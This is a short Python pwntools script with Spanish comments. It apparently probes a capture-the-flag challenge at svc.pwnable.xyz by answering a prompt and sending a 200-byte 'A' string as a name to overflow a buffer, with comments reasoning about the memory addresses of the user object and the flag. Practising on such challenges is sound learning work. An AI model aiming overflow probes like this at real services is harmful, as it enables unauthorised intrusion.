#!/usr/bin/env python3

from pwn import *

conn = remote('svc.pwnable.xyz', 30004)

# Recibir prompt
conn.recvuntil(b'[y/N]: ')

# Responder y
conn.sendline(b'y')

# Recibir "Name:"
conn.recvuntil(b'Name: ')

# Enviar payload para hacer overflow y ver si revela algo
# obj.usr está en 0x6010e0, flag está en 0x601080
# Diferencia: 0x6010e0 - 0x601080 = 0x60 = 96 bytes ANTES
# Entonces si hago overflow de obj.usr podría sobrescribir cosas DESPUÉS

# Probemos con un payload largo
payload = b'A' * 200

conn.sendline(payload)

# Recibir respuesta
data = conn.recvall(timeout=3)
log.info(f"Respuesta: {data}")

conn.close()